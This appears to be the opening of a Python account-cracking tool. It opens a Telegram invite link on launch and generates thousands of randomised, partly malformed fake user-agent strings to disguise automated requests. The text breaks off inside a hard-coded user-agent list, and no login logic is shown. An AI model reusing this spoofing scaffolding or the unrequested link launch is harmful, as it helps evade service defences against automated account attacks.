#===== ROWEDY 🌝🔥

#===== TELIGERM : XXX.COM
#---------------------[ IMPORT ]---------------------#
import os,sys,json,uuid,string,random,requests,urllib3,rich,base64,re
from concurrent.futures import ThreadPoolExecutor as ThreadPool
#---------------------[ LOOP ]---------------------#
loop = 0;oks =[];user=[];ugen=[];uas=[]
#========= [ JONE ]=====
os.system("xdg-open https://t.me/+tpDR8IFCCx8yOGRl")
sys.stdout.write('\x1b]2; R0W3DY 🔥 \x07')
#---------------------[ USER AGENT ]---------------------#
rr = random.randint
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
usa = ["Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}"]
for xtd in range(3005):
    ff=(f'Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}')
    uas.append(ff)
for sat in range(1000):
	a='NokiaX'
	b=random.randrange(1,9)
	c='-0'
	d=random.randrange(1,9)
	e='/'
	f=random.randrange(1,9)
	g='.0 ('
	h=random.randrange(1,12)
	i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
	j='UNTRUSTED/'
	k=random.randrange(1,3)
	l='.0'
	uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
	ugen.append(uaku2)
for xd in range(10000):
        aa='Mozilla/5.0 (Linux; U; Android'
        b=random.choice(['6','7','8','9','10','11','12','13'])
        c=f' TL-tl; {str(gt)}'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
for x in range(10000):
	aa='Mozilla/5.0 (Windows NT 6.1; WOW64)'
	b=random.choice(['4','5','6','7','8','9','10','11','12'])
	c='ASUS_I006D Build/RKQ1.201022.002'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.3'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 Sleipnir/3.5.28'
	uakua=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uakua)
ugen=['Mozilla/5.0 (Linux; U; Android 13;  en-us; GT-G339V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.4649.67 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 17;  en-us; GT-K74F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4866.45 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 6;  en-us; GT-U523I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4306.62 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 6;  en-us; GT-K714H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4406.132 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7;  en-us; GT-X34B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4787.116 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7;  en-us; GT-A279K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4311.70 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 4;  en-us; GT-L795J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4851.84 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 4;  en-us; GT-M695D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.4461.114 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 13;  en-us; GT-S991J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4581.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 13;  en-us; GT-Q267W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.4657.41 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 4;  en-us; GT-Z770V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4820.52 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 3;  en-us; GT-H919U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4205.76 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 6;  en-us; GT-P333F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4278.48 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 13;  en-us; GT-D773O) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.4266.91 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 6;  en-us; GT-I451H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4870.51 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 14;  en-us; GT-J727C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.4666.59 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 8;  en-us; GT-D813M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4698.42 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 8;  en-us; GT-V635A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4754.94 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 11;  en-us; GT-S807B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4461.103 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 15;  en-us; GT-Q389F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.4468.68 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5;  en-us; GT-V636R) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4288.43 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 11;  en-us; GT-G575S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.4224.63 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 4;  en-us; GT-G242L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.4830.67 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 15;  en-us; GT-U450E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4897.87 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 6;  en-us; GT-W955H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4462.43 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 6;  en-us; GT-D255I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4858.72 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 12;  en-us; GT-F846X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4478.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 12;  en-us; GT-A852F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4821.148 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 16;  en-us; GT-W685Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4535.76 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5;  en-us; GT-Q958N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4287.112 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 10;  en-us; GT-A44W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.4638.102 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 11;  en-us; GT-E981W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4595.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 10;  en-us; GT-H927O) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.4315.145 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 8;  en-us; GT-S296J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.4540.138 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 9;  en-us; GT-A356K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4594.103 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 14;  en-us; GT-V238G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4441.97 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 4;  en-us; GT-K922C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.4525.132 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 13;  en-us; GT-T845K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.4211.49 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 14;  en-us; GT-H145X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.4736.138 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 9;  en-us; GT-D588E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4726.42 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 13;  en-us; GT-F608S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4777.147 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 13;  en-us; GT-H684F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4797.138 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5;  en-us; GT-S55M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.4877.64 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 4;  en-us; GT-R48F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.4484.46 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 6;  en-us; GT-D960T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4809.117 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 8;  en-us; GT-X536Z) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4302.53 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 14;  en-us; GT-T436K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4826.46 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 12;  en-us; GT-D576N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.4823.149 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 14;  en-us; GT-E233U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4898.133 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 13;  en-us; GT-Z911S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4746.105 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 14;  en-us; GT-I763U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4422.45 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 13;  en-us; GT-D747L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.4862.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 15;  en-us; GT-Z523S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4241.73 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 12;  en-us; GT-P409G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.4485.114 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 12;  en-us; GT-S91D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4391.51 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 4;  en-us; GT-F770X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4246.105 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 8;  en-us; GT-K494W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4639.148 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7;  en-us; GT-P948N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4264.50 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 13;  en-us; GT-R476J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4459.121 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5;  en-us; GT-G460P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.4735.86 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 15;  en-us; GT-Q782W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4649.40 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5;  en-us; GT-M509H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4549.78 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 13;  en-us; GT-E515V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4290.133 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 6;  en-us; GT-K133N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4379.49 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 11;  en-us; GT-D721N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4625.77 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 12;  en-us; GT-X79M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4859.86 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 14;  en-us; GT-Z334R) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4241.98 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 13;  en-us; GT-L35W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4779.53 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 17;  en-us; GT-Z332E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4577.47 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 10;  en-us; GT-K978L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.4296.117 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 8;  en-us; GT-B605K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.4583.146 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 3;  en-us; GT-R550V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4450.130 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 17;  en-us; GT-I523G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.4312.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 13;  en-us; GT-E463I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4800.82 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 6;  en-us; GT-C959J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4508.121 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 16;  en-us; GT-A935Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4726.63 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 13;  en-us; GT-F140E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4298.74 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 3;  en-us; GT-A347W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4393.75 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 10;  en-us; GT-B641L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4663.126 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 12;  en-us; GT-M487I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4516.92 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 8;  en-us; GT-C388H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4649.131 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 3;  en-us; GT-B401K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4785.124 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 17;  en-us; GT-N531V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.4583.49 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 11;  en-us; GT-Y839W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.4505.102 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 10;  en-us; GT-B399W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.4873.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 15;  en-us; GT-Q780Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.4888.142 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 9;  en-us; GT-A306K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.4618.45 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 8;  en-us; GT-H433Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.4260.56 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 4;  en-us; GT-Y446S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4752.101 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 15;  en-us; GT-T216P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4591.130 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 11;  en-us; GT-C592X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.4604.69 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 4;  en-us; GT-U31W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4685.46 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 10;  en-us; GT-U784V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4220.130 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5;  en-us; GT-X870Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4802.46 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 12;  en-us; GT-X451T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.4343.86 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 4;  en-us; GT-B256H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4346.48 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 8;  en-us; GT-C875E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.4216.147 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 11;  en-us; GT-F580Z) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4714.94 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 14;  en-us; GT-D386R) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4829.109 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 12;  en-us; GT-S279Z) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4612.133 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 3;  en-us; GT-T847E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.4269.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 10;  en-us; GT-A531I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4533.137 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 16;  en-us; GT-V943A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.4608.66 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5;  en-us; GT-L639Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4532.81 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 14;  en-us; GT-C80K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.4766.134 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 14;  en-us; GT-W856L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4637.52 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 8;  en-us; GT-A844Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4585.132 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 11;  en-us; GT-H653E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4344.81 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 15;  en-us; GT-T973M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.4299.74 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 16;  en-us; GT-J279Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4384.78 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 3;  en-us; GT-X934I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.4593.101 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 9;  en-us; GT-Q156B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.4471.119 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 15;  en-us; GT-F378Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4836.101 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 8;  en-us; GT-F467O) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4745.56 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 12;  en-us; GT-N144C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4752.119 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7;  en-us; GT-B85G) AppleWebKit/537.36 (KHTML, like Gecko) 